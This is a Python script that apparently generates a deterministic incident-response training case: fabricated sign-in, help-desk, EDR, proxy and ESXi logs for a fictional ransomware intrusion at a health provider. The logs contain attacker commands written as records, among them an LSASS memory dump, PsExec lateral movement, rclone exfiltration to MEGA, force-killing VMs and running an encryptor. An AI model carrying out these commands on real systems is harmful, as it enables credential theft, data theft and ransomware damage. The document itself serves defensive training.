"""Write the evidence for a fictional BlackCat/ALPHV-style intrusion at Pinecrest Health Partners (PHP):
identity-provider sign-ins, help-desk tickets, EDR process events, proxy logs, an ESXi shell log and the
approved remote-tool list. Deterministic: the same files every run. Descriptive only: records, no tooling.
Usage: python3 tools/make_case.py case/
"""
import csv
import json
import random
import sys
from datetime import datetime, timedelta

OUT = sys.argv[1].rstrip("/")
rnd = random.Random(353)
T0 = datetime(2026, 10, 5, 0, 0, 0)          # Monday 00:00 UTC
def at(m): return T0 + timedelta(seconds=int(m * 60))
def iso(m): return at(m).strftime("%Y-%m-%dT%H:%M:%SZ")

STAFF = {"j.morales": ("IT", "US"), "k.lee": ("Billing", "US"), "p.osei": ("Clinical", "US"), "d.ward": ("IT", "US"),
         "m.rossi": ("Clinical", "US"), "a.khan": ("Billing", "US"), "s.berg": ("HR", "US"), "t.nash": ("Clinical", "CA")}
OFFICE_IP = {"US": "192.0.2.%d", "CA": "192.0.2.%d"}

# ---------- identity provider sign-ins ----------
idp = []
def signin(m, user, ip, country, app, result, mfa):
    idp.append({"time": iso(m), "user": user, "ip": ip, "country": country, "app": app, "result": result, "mfa": mfa})
for day in range(3):
    for u, (_, c) in STAFF.items():
        for k in range(rnd.randint(2, 5)):
            m = day * 1440 + rnd.uniform(13 * 60, 23 * 60)       # 08:00-18:00 US Central = 13:00-23:00 UTC
            signin(m, u, OFFICE_IP[c] % rnd.randint(20, 90), c, rnd.choice(["o365", "citrix", "vpn"]), "success", "push_approved")
# p.osei fumbles twice, then approves: normal
for i in range(2): signin(1440 + 15 * 60 + i * 0.5, "p.osei", "192.0.2.41", "US", "o365", "failure", "push_denied")
signin(1440 + 15 * 60 + 1.5, "p.osei", "192.0.2.41", "US", "o365", "success", "push_approved")
# Night 1: an MFA-fatigue attempt on k.lee that she withstands (all denied)
for i in range(12): signin(1440 + 4 * 60 + i * 0.7, "k.lee", "203.0.113.88", "NL", "citrix", "failure", "push_denied")
# j.morales signs in normally from the office on Monday afternoon
signin(1440 + 19 * 60, "j.morales", "192.0.2.33", "US", "o365", "success", "push_approved")

# ---------- help desk ----------
tickets = [
    {"ticket": "HD-4410", "time": iso(1440 + 14 * 60), "claimed_user": "s.berg", "action": "password_reset", "verified_by_callback": "yes", "note": "locked out after holiday"},
    {"ticket": "HD-4417", "time": iso(1440 + 19 * 60 + 40), "claimed_user": "j.morales", "action": "mfa_reset", "verified_by_callback": "no", "note": "new phone, urgent, on call tonight"},
    {"ticket": "HD-4418", "time": iso(1440 + 20 * 60), "claimed_user": "m.rossi", "action": "mfa_reset", "verified_by_callback": "yes", "note": "replaced phone"},
    {"ticket": "HD-4421", "time": iso(1440 + 22 * 60), "claimed_user": "a.khan", "action": "password_reset", "verified_by_callback": "yes", "note": "forgot password"},
]
# 25 minutes after the reset, "j.morales" enrols a new device and signs in from abroad
ATT = "198.51.100.44"
signin(1440 + 20 * 60 + 5, "j.morales", ATT, "RO", "citrix", "success", "new_device_enrolled")
signin(1440 + 20 * 60 + 6, "j.morales", ATT, "RO", "citrix", "success", "push_approved")
# A second fatigue run, on d.ward, that works on the 9th push
for i in range(8): signin(2 * 1440 + 3 * 60 + i * 0.6, "d.ward", "203.0.113.88", "NL", "vpn", "failure", "push_denied")
signin(2 * 1440 + 3 * 60 + 5.2, "d.ward", "203.0.113.88", "NL", "vpn", "success", "push_approved")
idp.sort(key=lambda e: e["time"])

# ---------- EDR process events ----------
edr = []
def proc(m, host, user, image, cmd):
    edr.append({"time": iso(m), "host": host, "user": user, "image": image, "command_line": cmd})
hosts = ["PHP-CTX01", "PHP-FS02", "PHP-DC01", "PHP-HD07", "PHP-WS12", "PHP-WS15"]
for _ in range(700):
    m = rnd.uniform(0, 3 * 1440); h = rnd.choice(hosts)
    img, cmd = rnd.choice([("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs"),
                           ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE"),
                           ("C:\\Program Files\\Citrix\\ICA Client\\wfica32.exe", "wfica32.exe"),
                           ("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe")])
    proc(m, h, "SYSTEM" if "svchost" in img or "taskhostw" in img else rnd.choice(list(STAFF)), img, cmd)
# The help desk's own AnyDesk is approved
for k in range(6):
    proc(rnd.uniform(1440, 2 * 1440), "PHP-HD07", "d.ward", "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe", "AnyDesk.exe --control")
U = "PHP\\j.morales"
S = 1440 + 20 * 60
proc(S + 12, "PHP-CTX01", U, "C:\\Users\\j.morales\\Downloads\\AnyDesk.exe", "AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent")
proc(S + 30, "PHP-CTX01", U, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ep bypass -f C:\\ProgramData\\ADRecon.ps1 -OutputDir C:\\ProgramData\\adr")
proc(S + 55, "PHP-CTX01", U, "C:\\ProgramData\\netscan.exe", "netscan.exe /hide /auto:C:\\ProgramData\\n.xml /range:10.50.0.1-10.50.3.254")
proc(S + 80, "PHP-CTX01", U, "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\ProgramData\\l.dmp full")
proc(S + 120, "PHP-CTX01", "PHP\\adm.cortez", "C:\\ProgramData\\PsExec64.exe", "PsExec64.exe \\\\PHP-FS02 -accepteula -s cmd.exe")
proc(S + 125, "PHP-FS02", "SYSTEM", "C:\\Windows\\PSEXESVC.exe", "PSEXESVC.exe")
proc(S + 140, "PHP-FS02", "SYSTEM", "C:\\ProgramData\\sync\\rclone.exe", "rclone.exe copy \\\\PHP-FS02\\Claims mega:php-claims --transfers 16 -q")
edr.sort(key=lambda e: e["time"])

# ---------- proxy ----------
proxy = []
for _ in range(1500):
    m = rnd.uniform(0, 3 * 1440); h = rnd.choice(hosts)
    proxy.append({"time": iso(m), "host": h, "dest": rnd.choice(["outlook.office365.example", "cdn.example.net", "updates.example.org", "portal.pinecrest.example"]),
                  "bytes_out": rnd.randint(500, 400000), "bytes_in": rnd.randint(2000, 5000000)})
for k in range(48):                       # 4 hours of uploads, every 5 minutes, ~0.8 GB each
    proxy.append({"time": iso(S + 141 + k * 5), "host": "PHP-FS02", "dest": "gfs208n114.userstorage.mega.co.nz",
                  "bytes_out": 800_000_000 + rnd.randint(-40_000_000, 40_000_000), "bytes_in": rnd.randint(20000, 90000)})
proxy.sort(key=lambda e: e["time"])

# ---------- ESXi shell ----------
esx = []
E = S + 141 + 47 * 5 + 95                 # a while after the last upload
def shell(m, line): esx.append("%s shell[%d]: [root]: %s" % (iso(m), 3100 + len(esx), line))
esx.append("%s sshd[2988]: Accepted keyboard-interactive/pam for root from 10.50.1.21 port 51522 ssh2" % iso(E - 2))
shell(E, "esxcli system version get")
shell(E + 0.5, "esxcli vm process list")
vms = ["EHR-DB01", "EHR-APP01", "EHR-APP02", "PACS01", "BILLING01", "FILE-ARCHIVE", "SCAN-SRV"]
for i, vm in enumerate(vms):
    shell(E + 1 + i * 0.1, "esxcli vm process kill --type=force --world-id=%d   # %s" % (2101500 + i * 37, vm))
shell(E + 3, "cd /vmfs/volumes/datastore1")
shell(E + 3.5, "chmod +x /tmp/svcupd && /tmp/svcupd --access-token 8c1e0f6b9d --no-prop-servers --extension qhr5zfk")
for i, vm in enumerate(vms):
    esx.append("%s vmkernel: File renamed: /vmfs/volumes/datastore1/%s/%s-flat.vmdk -> %s-flat.vmdk.qhr5zfk" % (iso(E + 4 + i * 0.3), vm, vm, vm))
esx.append("%s vmkernel: File created: /vmfs/volumes/datastore1/RECOVER-qhr5zfk-FILES.txt" % iso(E + 7))
shell(E + 8, "rm -f /tmp/svcupd")

# ---------- write ----------
with open(OUT + "/idp-signins.jsonl", "w") as f:
    for e in idp: f.write(json.dumps(e, separators=(",", ":")) + "\n")
with open(OUT + "/edr-process.jsonl", "w") as f:
    for e in edr: f.write(json.dumps(e, separators=(",", ":")) + "\n")
with open(OUT + "/helpdesk-tickets.csv", "w", newline="") as f:
    w = csv.DictWriter(f, fieldnames=list(tickets[0]), lineterminator="\n"); w.writeheader(); w.writerows(tickets)
with open(OUT + "/proxy.csv", "w", newline="") as f:
    w = csv.DictWriter(f, fieldnames=list(proxy[0]), lineterminator="\n"); w.writeheader(); w.writerows(proxy)
with open(OUT + "/esx01-shell.log", "w") as f:
    f.write("\n".join(esx) + "\n")
with open(OUT + "/approved-remote-tools.csv", "w") as f:
    f.write("host,tool\nPHP-HD07,AnyDesk\nPHP-HD07,Quick Assist\nPHP-CTX01,Citrix Workspace\n")
